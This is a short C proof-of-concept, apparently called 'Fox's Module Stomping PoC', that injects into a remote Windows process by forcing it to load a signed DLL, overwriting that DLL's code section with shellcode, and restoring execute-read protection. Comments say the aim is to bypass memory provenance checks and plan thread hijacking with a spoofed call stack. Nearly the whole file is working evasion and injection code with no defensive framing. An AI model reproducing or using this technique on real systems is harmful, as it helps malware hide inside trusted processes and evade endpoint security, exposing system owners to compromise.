#include <windows.h>
#include <stdio.h>

// Fox's Module Stomping PoC
BOOL StompModule(HANDLE hProcess, const char* targetDll, PVOID pShellcode, SIZE_t shellcodeSize) {
    // 1. Force target to load a benign, signed DLL (e.g., xpsprint.dll)
    PVOID pLoadLibrary = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    PVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(targetDll) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pDllPath, targetDll, strlen(targetDll) + 1, NULL);
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPath, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    // 2. Find the base address of the newly loaded benign DLL in the target
    // (Assuming we have a helper function GetRemoteModuleBase)
    HMODULE hRemoteModule = GetRemoteModuleBase(hProcess, targetDll);
    if (!hRemoteModule) return FALSE;

    // 3. Calculate the address of the .text section (executable code)
    // (Simplified: In reality, parse the remote PE headers to find the exact section)
    PVOID pTextSection = (PBYTE)hRemoteModule + 0x1000; 

    // 4. Change protection to RW (Write-only first to avoid RWX flags)
    DWORD oldProtect;
    VirtualProtectEx(hProcess, pTextSection, shellcodeSize, PAGE_READWRITE, &oldProtect);

    // 5. STOMP: Overwrite the legitimate Microsoft code with our payload
    WriteProcessMemory(hProcess, pTextSection, pShellcode, shellcodeSize, NULL);

    // 6. Restore original protection (RX) so it looks like normal executable code
    VirtualProtectEx(hProcess, pTextSection, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

    printf("[+] Module %s stomped at %p.\n", targetDll, pTextSection);
    printf("[+] Memory is MEM_IMAGE (file-backed). Provenance checks bypassed.\n");
    
    // Next step: Thread hijacking with a spoofed call stack pointing to pTextSection
    return TRUE;
}